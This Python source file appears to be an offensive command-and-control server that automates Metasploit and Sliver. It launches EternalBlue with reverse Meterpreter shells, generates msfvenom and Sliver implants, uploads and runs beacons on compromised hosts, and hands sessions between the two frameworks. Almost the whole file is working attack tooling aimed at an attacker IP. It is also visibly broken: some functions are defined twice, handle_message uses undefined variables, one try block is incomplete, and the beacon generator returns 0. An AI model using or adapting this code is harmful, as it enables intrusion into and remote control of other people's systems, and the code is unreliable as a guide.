import os
import time
import socket
import threading
import subprocess
import json
import pexpect
from socket_threading import Server
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

MSF_HOST = "10.1.1.2"
MSF_PORT = 1337
MSF_PASSWORD = "memes"
RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"

# Alex New
SLIVER_HOST = "10.1.1.2"
SLIVER_PORT = 55552
# Alex End

server = None
msfInstance = None

def run_meterpreter_exploit(target_ip):
    """Execute a Meterpreter payload against the target."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

    exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    if not exploit:
        return f"{RED}[!] Failed to load exploit module{RESET}"

    # Set parameters for the exploit
    exploit["RHOSTS"] = target_ip
    exploit["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
    exploit["LHOST"] = "10.1.1.2"
    exploit["LPORT"] = 4444  # Listening port

    # Execute the exploit
    job_id = exploit.execute()
    return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"

# Alex New
def generate_meterpreter_payload():
    output_file = "/workspace/enderCLI/meterpreter_payload"
    cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={MSF_HOST} LPORT=4444 -f elf -o {output_file}"
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"{GREEN}[+] Generated Meterpreter payload at {output_file}{RESET}")
        return output_file
    except Exception as e:
        print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
        return None
# Alex End

def monitor_meterpreter_sessions():
    """Continuously check for new sessions"""
    if msfInstance is None:
        return
    
    print(f"{GREEN}[+] Starting session monitor{RESET}")
    while True:
        try:
            sessions = msfInstance.sessions.list
            for sid, session in sessions.items():
                print(f"{GREEN}[+] Meterpreter session {sid} detected ({session['type']}){RESET}")
        time.sleep(5)  # Check every 5 seconds

def interact_meterpreter(session_id, command):
    """Send commands to an active Meterpreter session."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    session = msfInstance.sessions.session(session_id)
    if not session:
        return f"{RED}[!] Invalid session ID: {session_id}{RESET}"

    # Session passing (msf > sliver)
    # Alex New
    if command == "transfer-sliver":
        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
    #else:
    #    response = session.run_with_output(command)
    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
    # Alex End

    response = session.run_with_output(command)
    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"

def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt+1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Launch msfconsole in the background using a resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def connect_msf():
    """Connect to Metasploit and start monitoring"""
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    
    msf_instance = connect_to_msfserver(
        password=MSF_PASSWORD,
        server=MSF_HOST, 
        port=MSF_PORT
    )
    
    if msf_instance:
        global msfInstance
        msfInstance = msf_instance
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
        
        # Start session monitoring AFTER successful connection
        start_session_monitor()  # Now properly defined
        return msf_instance
    
    print(f"{RED}[!] Failed to register Metasploit{RESET}")
    return None

##############################
# Interact with Meterpreter
##############################
def interact_meterpreter(session_id, command):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    all_sess = msfInstance.sessions.list
    if session_id not in all_sess:
        return f"{RED}[!] Session ID {session_id} not found.{RESET}"

    stype = all_sess[session_id]["type"]
    if stype != "meterpreter":
        return f"{RED}[!] Session {session_id} is a {stype} session, not Meterpreter.{RESET}"

    sess_obj = msfInstance.sessions.session(session_id)

    if command.startswith("upload "):
        parts = command.split(maxsplit=2) 
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> upload <local_path> <remote_path>{RESET}"
        local_path, remote_path = parts[1], parts[2]
        try:
            sess_obj.upload(local_path, remote_path)
            return f"{GREEN}[+] Uploaded {local_path} to {remote_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Upload failed: {e}{RESET}"

    elif command.startswith("download "):
        parts = command.split(maxsplit=2)
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> download <remote_path> <local_path>{RESET}"
        remote_path, local_path = parts[1], parts[2]
        try:
            sess_obj.download(remote_path, local_path)
            return f"{GREEN}[+] Downloaded {remote_path} to {local_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Download failed: {e}{RESET}"

    elif command.strip() == "shell":
        try:
            sess_obj.shell_write("\n")
            time.sleep(1)
            output = sess_obj.shell_read()
            return f"{GREEN}Shell opened. Enter commands directly:\n{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Failed to open shell: {e}{RESET}"

    else:
        try:
            output = sess_obj.run_with_output(command)
            return f"{GREEN}{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Error in Meterpreter command: {e}{RESET}"

##############################
# Searching
##############################
def search_exploit(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_exploits = msfInstance.modules.exploits
    if keyword:
        filtered = [x for x in all_exploits if keyword.lower() in x.lower()]
    else:
        filtered = all_exploits
    total = len(filtered)
    paginated = filtered[start : start+count]
    numbered = [f"{i+1+start}. {ex}" for i,ex in enumerate(paginated)]
    if start+count < total:
        numbered.append(f"{BLUE}[SERVER] Send 'next'/'prev' or 'exit'{RESET}")
    return numbered, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_aux = msfInstance.modules.auxiliary
    if keyword:
        filtered = [a for a in all_aux if keyword.lower() in a.lower()]
    else:
        filtered = all_aux
    total = len(filtered)
    paginated = filtered[start : start+count]
    return paginated, total


##############################
# Parse user param
##############################
def parse_param_value(opt_data, user_input):
    """Convert user_input to correct type: int for port, bool, etc."""
    if user_input is None:
        return None
    user_input = user_input.strip()
    if not user_input:
        return None

    msf_type = opt_data.get('type', '').lower()
    default_val = opt_data.get('default', None)

    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    return user_input

def run_msf_exploit(mtype, mname, user_params, c2="metasploit"):
    """Run the selected exploit with parameters, no extra prompting."""
    
    # Alex New
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"
    # Alex End
    
    exploit = msfInstance.modules.use(mtype, mname)
    if not exploit:
        return f"{RED}[!] Could not load {mtype} module: {mname}{RESET}"

    # Alex New
    # BYOS: bring your own stager (msf > sliver)
    if c2 == "sliver":
        # Generate Sliver shellcode
        beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="shellcode")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver shellcode.{RESET}"
        with open(beacon_path, "rb") as f:
            shellcode = f.read()
        exploit["PAYLOAD"] = "generic/custom"
        exploit["CUSTOM_PAYLOAD"] = shellcode
        exploit["LHOST"] = SLIVER_HOST
        exploit["LPORT"] = SLIVER_PORT
    else:
        exploit["PAYLOAD"] = "linux/x64/meterpreter/reverse_tcp" # meterpreter for linux
        exploit["LHOST"] = MSF_HOST
        exploit["LPORT"] = 4444 # msf server port? check client.py
    # Alex End

    # Only set the user_params we collected in handle_message
    for param_key, param_value in user_params.items():
        exploit[param_key] = param_value

    print(f"{GREEN}Running exploit: {mname}{RESET}")
    result = exploit.execute()
    print(f"{BLUE}Exploit Result: {result}{RESET}")
    return result


# Alex New
def interact_sliver(session_id, command):
    """Interact with a Sliver session, including handoff to Metasploit."""
    global sliver_client
    if sliver_client is None:
        return f"{RED}[-] Sliver client not running.{RESET}"

    try:
        # Check if session exists by listing sessions
        sliver_client.sendline("sessions")
        time.sleep(2)
        output = sliver_client.read_nonblocking(size=4096, timeout=2)
        if session_id not in output:
            return f"{RED}[!] Invalid Sliver session ID: {session_id}{RESET}"

        if command == "handoff_to_metasploit":
            # Generate Meterpreter payload
            payload_path = generate_meterpreter_payload()
            if not payload_path:
                return f"{RED}[-] Failed to generate Meterpreter payload.{RESET}"

            # Use the session
            sliver_client.sendline(f"use {session_id}")
            sliver_client.expect(r">", timeout=10)

            # Upload payload
            upload_cmd = f"upload {payload_path} /workspace/enderCLI/meterpreter_payload"
            sliver_client.sendline(upload_cmd)
            time.sleep(5)
            output = sliver_client.read_nonblocking(size=4096, timeout=5)
            if "Uploaded" not in output:
                return f"{RED}[!] Failed to upload Meterpreter payload: {output}{RESET}"

            # Execute payload
            execute_cmd = "execute -f /workspace/enderCLI/meterpreter_payload"
            sliver_client.sendline(execute_cmd)
            time.sleep(5)
            output = sliver_client.read_nonblocking(size=4096, timeout=5)
            print(f"{GREEN}[+] Execute output: {output}{RESET}")

            # Return to main prompt
            sliver_client.sendline("sessions")
            return f"{GREEN}[+] Handed off Sliver session {session_id} to Metasploit{RESET}"
        else:
            sliver_client.sendline(f"use {session_id}")
            sliver_client.expect(r">", timeout=10)
            sliver_client.sendline(command)
            time.sleep(2)
            response = sliver_client.read_nonblocking(size=4096, timeout=2)
            return f"{GREEN}[+] Sliver Response:\n{response}{RESET}"

    except Exception as e:
        return f"{RED}[!] Error interacting with Sliver session: {e}{RESET}"
# Alex End

# Alex New
def generate_beacon(seconds, jitter, http, os, arch, beacon_name, format="bin"):
    output_file = f"/workspace/enderCLI/{beacon_name}"
    if format == "shellcode":
        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --format shellcode --save {output_file}"
    else:
        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --save {output_file}"
    
    print(f"{GREEN}[+] Sending Beacon Creation Command: {beacon_creation_command}{RESET}")
    sliver_client.sendline(beacon_creation_command)
    output = ""
    timeout = 30
    start_time = time.time()
    while time.time() - start_time < timeout:
        chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
        output += chunk
        print(chunk)
        if 'Implant saved to' in chunk:
            break
    return 0
# Alex End

#####################
# Validate Module 
#####################
def validate_module_type(module_type, module_name):
    if msfInstance is None:
        return False, f"{RED}[-] Not connected to Metasploit.{RESET}"

    if module_type == "exploit":
        if module_name not in msfInstance.modules.exploits:
            return False, f"{RED}{module_name} is NOT an exploit. Try: run auxiliary {module_name}{RESET}"
    elif module_type == "auxiliary":
        if module_name not in msfInstance.modules.auxiliary:
            return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
    return True, None


##############################
# Run Exploit (skip "Invalid option 'PAYLOAD'")
##############################
##############################
# Run the Exploit
##############################
def run_msf_exploit(mtype, mname, user_params):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    try:
        mod = msfInstance.modules.use(mtype, mname)
    except Exception as e:
        return f"{RED}[!] Failed to load module: {str(e)}{RESET}"

    # Payload validation for reverse shells
    if mtype == "exploit" and "PAYLOAD" in user_params:
        payload = user_params["PAYLOAD"]
        if "reverse" in payload:
            missing = [opt for opt in ["LHOST", "LPORT"] if opt not in user_params]
            if missing:
                return f"{RED}[!] Reverse payload requires: {', '.join(missing)}{RESET}"

    try:
        mod.payload = user_params.get("PAYLOAD", "")
    except:
        pass  # Fallback to manual option setting

    required_options = ["RHOSTS", "LHOST", "LPORT"]
    for opt in required_options:
        if opt in mod.options and opt not in user_params:
            return f"{RED}[!] Missing required option: {opt}{RESET}"

    for k, v in user_params.items():
        mod[k] = v

    try:
        result = mod.execute()
        return json.dumps(result)
    except Exception as e:
        return f"{RED}[!] Exploit failed: {str(e)}{RESET}"
    
##############################
# Main Handler
##############################
def handle_message(data, client_address):
    global msfInstance
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")

    # Track user state
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(client_address, 
                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None, 'beacon': False})

    if command == "create_beacon": 
        if len(options) < 9:
            response = f"{RED}[!] Invalid Sliver Beacon Creation command: create_beacon [operator_name] [lhost] [seconds] [jitter] [http] [os] [arch] [beacon_name]{RESET}"
        else:
            response = f"{BLUE}[+] Creating Sliver Beacon...{RESET}"
            beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8])
            if beacon:
                response = f"{BLUE}[+] Created Sliver Beacon!{RESET}"
                client_state['beacon'] = True
            else:
                response = f"{RED}[!] Sliver beacon creation failed!{RESET}"

    elif command == "connect":
        response = f"{BLUE}[+] Connecting to MSF...{RESET}"
        msfInstance = connect_msf()
        response = f"{BLUE}[+] Connected to Metasploit!{RESET}" if msfInstance else f"{RED}[-] Failed to connect to Metasploit{RESET}"
        client_state['in_search'] = False  # Reset search state on connect
        client_state['in_run'] = False
    
    elif command == "search":
        if len(parts) < 3:
            return f"{RED}[!] Usage: search [exploits|auxiliary] <keyword> [start_index]{RESET}"

        mod_type = parts[1].lower()
        leftover = parts[2].split()
        keyword = leftover[0]
        start_idx = 0
        if len(leftover) > 1 and leftover[-1].isdigit():
            start_idx = int(leftover[-1])
            keyword = ' '.join(leftover[:-1])

        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

        if mod_type == "exploits":
            client_state['keyword'] = keyword
            client_state['start'] = start_idx
            client_state['in_search'] = True
            results, total = search_exploit(keyword, start_idx)
            if results:
                out = (
                    f"{BLUE}Exploit modules matching '{keyword}' "
                    f"({start_idx}-{min(start_idx+20, total)} of {total}):\n{RESET}"
                )
                out += "\n".join(results)
                return out
            else:
                response = f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    elif command == "run":
        """
        Simplified 'run' command that ONLY prompts for options in ALWAYS_PROMPT_OPTS 
        and sets defaults for everything else (if available).
        Skips any parameters outside this list, even if they have no default.
        """
        if len(options) < 3:
            response = f"{RED}[!] Invalid run command: run [exploit]/[auxiliary] [module_name]{RESET}"
        else:
            module_type = options[1]
            module_name = options[2]
            
            # Alex New
            c2_type = options[3] if len(options) > 3 else "metasploit"
            # Alex End
            
            valid_ok, err_msg = validate_module_type(module_type, module_name)

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            elif not valid_ok:
                response = err_msg
            else:
                exploit = msfInstance.modules.use(module_type, module_name)
                if not exploit:
                    response = f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
                else:
                    ALWAYS_PROMPT_OPTS = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT"}

                    exploit_info = exploit._info.get('options', {})
                    module_options = []

                    # 1. For each known param, decide whether to prompt or to skip
                    for opt_name, opt_data in exploit_info.items():
                        default_val = opt_data.get('default', None)
                        
                        # If it's in our short list, we plan to prompt
                        if opt_name in ALWAYS_PROMPT_OPTS:
                            prompt_msg = f"Please enter {opt_name}"
                            if default_val is not None:
                                prompt_msg += f" (default: {default_val})"

                            module_options.append({
                                'name': opt_name,
                                'default': default_val,
                                'prompt': prompt_msg
                            })
                        else:
                            # If there's a default, set it silently
                            if default_val is not None:
                                exploit[opt_name] = default_val
                            # If it's required and no default is set, we do nothing—exploit might fail.

                    # 2. Prepare the run state for prompting
                    client_state['in_run'] = True
                    client_state['exploit_options'] = module_options
                    client_state['user_params'] = {}
                    client_state['module_type'] = module_type
                    client_state['module_name'] = module_name
                    
                    # Alex New
                    client_state['c2'] = c2_type
                    # Alex End

                    # 3. If there are no prompts, just execute immediately
                    if not module_options:
                        result = exploit.execute()
                        response = json.dumps(result)
                        client_state['in_run'] = False
                    else:
                        response = f"{BLUE}{module_options[0]['prompt']}: {RESET}"

    elif client_state['in_run']:
        """
        The user is responding to a previously asked param. 
        We only prompt for the next param in ALWAYS_PROMPT_OPTS. 
        """
        exploit = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
        if not exploit:
            response = f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"
            client_state['in_run'] = False
            return response
    
        if not client_state['exploit_options']:
            response = f"{RED}[!] No more options to fill.{RESET}"
            client_state['in_run'] = False
        else:
            return f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    ###################################
    # next / prev / exit in search
    ###################################
    elif command in ["next","prev"] and client_state['in_search']:
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        if command == "next":
            client_state['start'] += 20
        else:
            client_state['start'] -= 20
        results, total = search_exploit(client_state['keyword'], client_state['start'])
        if results:
            out = (
                f"{BLUE}Exploit modules matching '{client_state['keyword']}' "
                f"({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}"
            )
            out += "\n".join(results)
            return out
        else:
            return f"{BLUE}No more exploit modules available.{RESET}"

    elif command == "exit" and client_state['in_search']:
        client_state['in_search'] = False
        client_state['keyword'] = None
        client_state['start'] = 0
        return f"{BLUE}Returned to normal CLI.{RESET}"

    ###################################
    # run
    ###################################
    elif command == "run":
        tokens = data.split()
        if len(tokens) < 3:
            return f"{RED}[!] Usage: run [exploit|auxiliary] <module_name>{RESET}"

        module_type = tokens[1].lower()
        module_name = tokens[2]
        ok, err_msg = validate_module_type(module_type, module_name)
        if not ok:
            return err_msg

        mod_obj = msfInstance.modules.use(module_type, module_name)
        if not mod_obj:
            return f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"

        # For exploits => RHOSTS,RPORT,PAYLOAD,LHOST,LPORT
        # For auxiliary => USERNAME,PASSWORD,RHOSTS,RPORT,THREADS
        if module_type == "exploit":
            ALWAYS_PROMPT_OPTS = ["RHOSTS","RPORT","PAYLOAD","LHOST","LPORT"]
        else:
            ALWAYS_PROMPT_OPTS = ["USERNAME","PASSWORD","RHOSTS","RPORT","THREADS"]

        exploit_info = mod_obj._info.get("options", {})

        # We'll do a 2-phase approach for exploit: ask RHOSTS,RPORT,PAYLOAD, then LHOST,LPORT
        first_pass = []
        second_pass = []

        if module_type == "exploit":
            for o in ["RHOSTS","RPORT","PAYLOAD"]:
                if o in exploit_info or o == "PAYLOAD":
                    first_pass.append(o)
            for o in ["LHOST","LPORT"]:
                if o in exploit_info:
                    second_pass.append(o)
        else:
            # For auxiliary
            first_pass = ["RHOSTS","RPORT"]
            second_pass = ["USERNAME","PASSWORD","THREADS"]

        final_list = []
        # 1) first pass
        for opt in first_pass:
            od = exploit_info.get(opt, {"type":"string","default":None})
            def_val = od.get("default", None)
            pmpt = f"Please enter {opt}"
            if def_val is not None:
                pmpt += f" (default: {def_val})"
            final_list.append({
                "name": opt,
                "default": def_val,
                "prompt": pmpt
            })

        # 2) second pass
        for opt in second_pass:
            od = exploit_info.get(opt, {"type":"string","default":None})
            def_val = od.get("default", None)
            pmpt = f"Please enter {opt}"
            if def_val is not None:
                pmpt += f" (default: {def_val})"
            final_list.append({
                "name": opt,
                "default": def_val,
                "prompt": pmpt
            })

        if not final_list:
            # No prompts => run immediately
            res = mod_obj.execute()
            return json.dumps(res)
        else:
            client_state['in_run'] = True
            client_state['exploit_options'] = final_list
            client_state['user_params'] = {}
            client_state['module_type'] = module_type
            client_state['module_name'] = module_name
            return f"{BLUE}{final_list[0]['prompt']}: {RESET}"

    ###################################
    # continuing the run (prompt cycle)
    ###################################
    elif client_state['in_run']:
        mod_obj = msfInstance.modules.use(client_state['module_type'], client_state['module_name'])
        if not mod_obj:
            client_state['in_run'] = False
            return f"{RED}[!] Could not load {client_state['module_type']} module: {client_state['module_name']}{RESET}"

        if not client_state['exploit_options']:
            client_state['in_run'] = False
            return f"{RED}[!] No more options to fill.{RESET}"

        curr_opt = client_state['exploit_options'][0]
        param_name = curr_opt['name']
        user_input = data.strip()

        fallback_opt = {"default": None, "type":"string"}
        msfopt = mod_obj._info["options"].get(param_name, fallback_opt)
        parsed_val = parse_param_value(msfopt, user_input)
        client_state['user_params'][param_name] = parsed_val

        # Check if the current parameter is PAYLOAD and we just set it
        if param_name == "PAYLOAD" and parsed_val:
            try:
                payload_mod = msfInstance.modules.use('payload', parsed_val)
                payload_option_details = payload_mod._info.get('options', {})  # Get list of option names
                
                for opt_name, opt_details in payload_option_details.items():
                    if opt_details.get('required', False):
                        if opt_name not in mod_obj.options and opt_name not in client_state['user_params']:
                            prompt_msg = f"Please enter {opt_name}"
                            if 'default' in opt_details:
                                prompt_msg += f" (default: {opt_details['default']})"
                            client_state['exploit_options'].insert(0, {
                                "name": opt_name,
                                "default": opt_details.get('default', None),
                                "prompt": prompt_msg
                            })
            except Exception as e:
                client_state['in_run'] = False
                return f"{RED}[!] Error loading payload: {str(e)}{RESET}"

        client_state['exploit_options'].pop(0)
        if not client_state['exploit_options']:
            # run exploit now
            mtype = client_state['module_type']
            mname = client_state['module_name']
            params = client_state['user_params']
            client_state['in_run'] = False
            resp = run_msf_exploit(mtype, mname, params)
            if isinstance(resp, str):
                return resp
            else:
                return json.dumps(resp)
        else:
            nxt = client_state['exploit_options'][0]
            return f"{BLUE}{nxt['prompt']}: {RESET}"

    ###################################
    # sessions
    ###################################
    elif command == "sessions":
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
            
        sessions = msfInstance.sessions.list  # Forces refresh
        if not sessions:
            return f"{YELLOW}[!] No active sessions detected{RESET}"
            
        output = []
        for sid, details in sessions.items():
            session_info = (
                f"Session {sid}:\n"
                f"  Type: {details.get('type', 'unknown')}\n"
                f"  Host: {details.get('session_host', 'unknown')}\n"
                f"  Port: {details.get('session_port', 'unknown')}\n"
                f"  Via: {details.get('via_exploit', 'unknown')}"
            )
            output.append(session_info)
            
        return f"{GREEN}Active Sessions:\n{RESET}" + "\n\n".join(output)

    ###################################
    # meterpreter
    ###################################
    elif command.startswith("meterpreter"):
        parts = command.split(maxsplit=2)
        if len(parts) < 3:
            response = f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
        else:
            session_id, meterpreter_command = parts[1], parts[2]
            try:
                session = msfInstance.sessions.session(session_id)
                output = session.run_with_output(meterpreter_command)
                response = f"{GREEN}{output}{RESET}"
            except KeyError:
                response = f"{RED}Session ID {session_id} does not exist.{RESET}"
    
    # Alex New
    elif command == "get-sliver-sessions":
        if sliver_client is None or not sliver_client.isalive():
            response = f"{RED}[-] Sliver client not running.{RESET}"
        else:
            sliver_client.sendline("sessions")
            time.sleep(2)
            output = sliver_client.read_nonblocking(size=4096, timeout=2)
            response = f"{GREEN}[+] Sliver Sessions:\n{output}{RESET}"
            
    elif command.startswith("sliver"):
        sections = data.split(maxsplit=2)
        if len(sections) < 3:
            response = f"{RED}[!] Usage: sliver <session_id> <command>{RESET}"
        else:
            session_id, sliver_command = parts[1], parts[2]
            response = interact_sliver(session_id, sliver_command)
    # Alex End
    
    elif command == "jobs":
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        all_jobs = msfInstance.jobs.list
        if all_jobs:
            lines = []
            for jid, jinfo in all_jobs.items():
                lines.append(f"ID: {jid}, Name: {jinfo['name']}")
            return f"{GREEN}Active Jobs:\n" + "\n".join(lines) + f"{RESET}"
        else:
            jobs = msfInstance.jobs.list
            if jobs:
                job_list = "\n".join([
                    f"ID: {jid}, Name: {jdata['name']}"
                    for jid, jdata in jobs.items()
                ])                
                response = f"{GREEN}Active Jobs:\\n{job_list}{RESET}"
            else:
                response = f"{RED}No active jobs.{RESET}"

    elif command == "quit":
        response = f"{GREEN}[+] Server shutting down as requested by {client_address}{RESET}"
        if server is not None:
            server.exit()
        else:
            response = f"{RED}[!] Server not initialized {RESET}"
        
        return response
            
    else:
        return f"{RED}Invalid command or not in search mode.{RESET}"


##############################
# MAIN
##############################
def main():
    global server
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()


if __name__ == "__main__":
    main()
